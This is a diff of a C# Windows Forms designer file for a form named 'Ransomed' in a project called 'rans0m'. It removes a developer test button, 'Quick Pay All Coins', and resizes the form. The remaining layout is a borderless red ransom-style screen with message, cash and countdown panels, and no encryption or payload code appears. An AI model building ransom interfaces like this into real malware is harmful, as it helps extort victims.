@@ -40,7 +40,6 @@ namespace rans0m
             pnl_timer = new Panel();
             lbl_timeTitle = new Label();
             lbl_time = new Label();
-            btn_quickPay = new Button();
             timer1 = new System.Windows.Forms.Timer(components);
             pnl_titleBar.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
@@ -179,22 +178,6 @@ namespace rans0m
             lbl_time.Text = "01:18";
             lbl_time.TextAlign = ContentAlignment.MiddleRight;
             // 
-            // btn_quickPay
-            // 
-            btn_quickPay.BackColor = Color.FromArgb(28, 28, 28);
-            btn_quickPay.Cursor = Cursors.Hand;
-            btn_quickPay.FlatAppearance.BorderColor = Color.FromArgb(80, 80, 80);
-            btn_quickPay.FlatStyle = FlatStyle.Flat;
-            btn_quickPay.Font = new Font("Segoe UI", 9F, FontStyle.Bold);
-            btn_quickPay.ForeColor = Color.FromArgb(255, 215, 0);
-            btn_quickPay.Location = new Point(12, 328);
-            btn_quickPay.Name = "btn_quickPay";
-            btn_quickPay.Size = new Size(520, 32);
-            btn_quickPay.TabIndex = 5;
-            btn_quickPay.Text = "[DEV TESTING] Quick Pay All Coins";
-            btn_quickPay.UseVisualStyleBackColor = false;
-            btn_quickPay.Click += btn_quickPay_Click;
-            // 
             // timer1
             // 
             timer1.Interval = 1000;
@@ -206,9 +189,8 @@ namespace rans0m
             AutoScaleDimensions = new SizeF(7F, 15F);
             AutoScaleMode = AutoScaleMode.Font;
             BackColor = Color.FromArgb(220, 0, 0);
-            ClientSize = new Size(544, 372);
+            ClientSize = new Size(544, 330);
             ControlBox = false;
-            Controls.Add(btn_quickPay);
             Controls.Add(pnl_timer);
             Controls.Add(pnl_cash);
             Controls.Add(pnl_message);
@@ -217,10 +199,10 @@ namespace rans0m
             Controls.Add(pnl_titleBar);
             FormBorderStyle = FormBorderStyle.None;
             MaximizeBox = false;
-            MaximumSize = new Size(544, 372);
+            MaximumSize = new Size(544, 330);
             MdiChildrenMinimizedAnchorBottom = false;
             MinimizeBox = false;
-            MinimumSize = new Size(544, 372);
+            MinimumSize = new Size(544, 330);
             Name = "Ransomed";
             ShowIcon = false;
             ShowInTaskbar = false;
@@ -254,7 +236,6 @@ namespace rans0m
         private Panel pnl_timer;
         private Label lbl_timeTitle;
         private Label lbl_time;
-        private Button btn_quickPay;
         private System.Windows.Forms.Timer timer1;
     }
 }
